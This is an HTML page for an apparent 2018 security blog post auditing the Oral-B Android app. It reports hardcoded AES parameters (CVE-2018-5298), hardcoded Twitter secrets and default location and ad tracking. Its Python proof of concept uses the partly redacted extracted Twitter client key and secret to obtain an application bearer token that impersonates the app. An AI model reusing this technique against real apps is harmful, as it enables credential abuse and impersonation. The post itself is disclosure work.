@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Auditing the Oral-B App (v5.0.0) (1 CVE)</title>
+        <style>
+
+    html body {
+        font-family: 'Raleway', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: red;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+
+
+
+<link rel="stylesheet" href="/css/font.css">
+
+
+ <link rel="stylesheet" href="/css/solarized-dark.min.css"> 
+
+
+<link rel="stylesheet" href="/css/bootstrap-min.css" integrity="">
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/css/font-awesome.min.css" integrity="">
+ 
+
+
+    <script src="https://ps1337.github.io/js/highlight.min.js"></script>
+
+     <script src="https://ps1337.github.io/js/python.min.js"></script>  <script src="https://ps1337.github.io/js/cpp.min.js"></script>  <script src="https://ps1337.github.io/js/json.min.js"></script>  <script src="https://ps1337.github.io/js/go.min.js"></script> 
+
+    <script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="https://ps1337.github.io/js/jquery.min.js"></script>
+
+
+<script src="https://ps1337.github.io/js/bootstrap.min.js"></script>
+
+
+<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
+ <meta name="generator" content="Hugo 0.52" />
+        
+
+        
+    </head>
+
+    
+
+
+    <body>
+         
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">Auditing the Oral-B App (v5.0.0) (1 CVE)</a>
+
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="/">Home</a></li>
+                            
+                                <li><a href="/post/">Posts</a></li>
+                            
+                                <li><a href="/project/">Projects</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="mailto:ps1337@mailbox.org"><i class="fa fa-envelope-o"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://github.com/ps1337/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="index.xml"><i class="fa fa-rss"></i></a></li>
+                            
+                        </ul>
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="/post/oral-b/">Auditing the Oral-B App (v5.0.0) (1 CVE)</a></h4>
+    <h5>January 8, 2018</h5>
+    
+    <a href="tags/android"><kbd class="item-tag">android</kbd></a>
+    
+    <a href="tags/cve"><kbd class="item-tag">cve</kbd></a>
+    
+
+</div>
+
+
+    <br> <div class="text-justify">
+
+<p>Upon assessing the Oral-B app (<code>com.pg.oralb.oralbapp</code>), the following findings have been made:</p>
+
+<h1 id="cve-2018-5298-hardcoded-aes-parameters">CVE-2018-5298: Hardcoded AES Parameters</h1>
+
+<p>Guess what, hardcoded AES parameters:</p>
+
+<p><img src="/img/oral-b/keys.png" alt="AES Parameters" /></p>
+
+<p>These parameters are stored in the class <code>OralBApplication</code> and also get used there:</p>
+
+<p><img src="/img/oral-b/keyUsage.png" alt="AES Parameter Usage" /></p>
+
+<p>The stored AES parameters are used to encrypt and decrypt the locally stored shared preferences in the class called <code>Preferences</code>:</p>
+
+<p><img src="/img/oral-b/sharedPrefsEnc.png" alt="AES Parameter Usage" /></p>
+
+<p>Because of the static key, an attacker can gain access to user data more easily by leveraging access to the preferences XML file.</p>
+
+<h1 id="twitter-secrets">Twitter Secrets</h1>
+
+<p>Using hardcoded Twitter secrets, it&rsquo;s possible to create bearer tokens impersonating the Oral-B twitter application. The secrets stored in the app are applicationtokens only - in my tests it was not possible to authenticate in user context.</p>
+
+<p>This PoC generates generates such an application token using the secret values found by decompiling the application:</p>
+
+<pre><code>#!/usr/bin/python3
+
+import base64
+import requests
+
+client_key = '2UGKNRVIDdgC[...]'
+client_secret = 'ycXHbtEKNAK2vPGf[...]'
+
+key_secret = '{}:{}'.format(client_key, client_secret) \
+    .encode('ascii')
+b64_encoded_key = base64.b64encode(key_secret)
+b64_encoded_key = b64_encoded_key.decode('ascii')
+
+base_url = 'https://api.twitter.com/'
+auth_url = '{}oauth2/token'.format(base_url)
+
+auth_headers = {
+    'Authorization': 'Basic {}'.format(b64_encoded_key),
+    'Content-Type': 'application/x-www-form-urlencoded;\
+        charset=UTF-8'
+}
+
+auth_data = {
+    'grant_type': 'client_credentials'
+}
+
+auth_resp = requests.post(auth_url, headers=auth_headers,
+                          data=auth_data)
+access_token = auth_resp.json()['access_token']
+</code></pre>
+
+<h1 id="tracking">Tracking</h1>
+
+<p>Upon running the app, the user automatically gets tracked. There is no opt-in required, it&rsquo;s enabled by default.</p>
+
+<p>As you can see, third party advertising providers are allowed to gain access to the user location automatically. Unique advertising IDs are automatically assigned.</p>
+
+<p><img src="/img/oral-b/3dpartyTracking.png" alt="Tracking" /></p>
+
+<p>It&rsquo;s possible to add your dentist to the Oral-B app. This process uses a server side API to search for a specific dentist in your location. This allows Oral-B to access your location and gain information about your dentist:</p>
+
+<p><img src="/img/oral-b/dentistSearchLocationName.png" alt="Time to get a dentist" /></p>
+
+<p>Of course, facebook tracking is also enabled by default:</p>
+
+<p><img src="/img/oral-b/facebookTracking.png" alt="Facebook Tracking" /></p>
+
+<p>Last but not least, the weather functionality of course also requires and transmits the current location:</p>
+
+<p><img src="/img/oral-b/weatherLocation.png" alt="Location transfer" /></p>
+
+<p>Please note no transmission of user specific brushing data has been identified. However, there is a cache that saves the last brushing sessions.</p>
+</div>
+
+    
+    
+
+    
+
+        <h4 class="page-header">Related</h4>
+
+         <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="/post/realtek-driverutil/">Exploiting Unqoted Service Paths For Fun and No Profit</a></h4>
+    <h5>March 15, 2018</h5>
+    
+    <a href="tags/exploit"><kbd class="item-tag">exploit</kbd></a>
+    
+    <a href="tags/cve"><kbd class="item-tag">cve</kbd></a>
+    
+    <a href="tags/windows"><kbd class="item-tag">windows</kbd></a>
+    
+
+</div>
+  <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="/post/nq-contactsbackup/">Auditing NQ Contacts Backup &amp; Restore 1.1 (3 CVEs)</a></h4>
+    <h5>October 29, 2017</h5>
+    
+    <a href="tags/android"><kbd class="item-tag">android</kbd></a>
+    
+    <a href="tags/cve"><kbd class="item-tag">cve</kbd></a>
+    
+
+</div>
+  <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="/post/write-diary/">Auditing WriteDiary.com (2 CVEs) </a></h4>
+    <h5>October 27, 2017</h5>
+    
+    <a href="tags/android"><kbd class="item-tag">android</kbd></a>
+    
+    <a href="tags/cve"><kbd class="item-tag">cve</kbd></a>
+    
+
+</div>
+ 
+
+    
+
+    
+
+</main>
+
+        <footer>
+
+            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
+
+        </footer>
+
+    </body>
+
+</html>
+
